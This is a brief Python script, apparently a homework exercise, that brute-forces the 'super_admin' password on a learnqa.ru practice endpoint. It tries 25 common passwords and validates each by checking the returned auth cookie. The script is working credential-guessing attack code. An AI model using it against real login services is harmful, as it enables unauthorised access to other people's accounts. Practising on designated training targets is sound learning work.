import requests

key = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "	555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

m = 0

while m < 25:
    valid = {"login": "super_admin", "password": key[m]}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=valid)
    cookie = response1.cookies.get('auth_cookie')
    valid_cookie = {'auth_cookie': cookie}

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=valid_cookie)

    if response2.text != 'You are NOT authorized':
        print(f"Valid password: {key[m]}")
        print(response2.text)

    m += 1
